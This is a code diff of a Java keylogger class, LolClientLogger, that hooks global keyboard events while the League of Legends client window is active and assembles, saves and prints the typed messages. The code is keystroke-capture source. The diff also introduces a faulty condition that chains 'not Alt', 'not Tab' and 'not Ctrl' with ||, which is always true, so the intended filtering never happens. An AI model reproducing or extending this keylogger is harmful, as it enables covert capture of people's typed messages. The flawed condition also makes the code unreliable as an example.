@@ -17,7 +17,7 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
     private static LolClientLogger ourInstance = new LolClientLogger();
 
     private LolClientLogger() {
-        super.baseMessage = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
+        baseMessage = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
         super.sendKey = "Enter";
     }
 
@@ -29,20 +29,20 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
     public void nativeKeyPressed(NativeKeyEvent e) {
         if (accessWindow.getActiveWindowTitle().equals(Globals.lolClient)) {
             if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals(sendKey)) {
-                try {
-                    System.out.println(message);
-                    saveMessage();
-                } catch (IOException e1) {
-                    e1.printStackTrace();
+                saveMessage();
+                for (String s: log) {
+                    System.out.println(s);
                 }
+
             } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")) {
                 message = message + " ";
             } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Backspace")) {
                 if (message.length() > 0) {
                     message = message.substring(0, message.length() - 1);
                 }
-            } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).length() > 0) {
-                System.out.println(e.getKeyCode());
+            } else if(!NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Alt") ||
+                    !NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Tab") ||
+                    !NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Ctrl")) {
                 message = message + NativeKeyEvent.getKeyText(e.getKeyCode());
             }
         }
@@ -50,7 +50,7 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
 
     @Override
     void setDefaults() {
-        super.baseMessage = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
+        baseMessage = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
         message = "";
     }
 
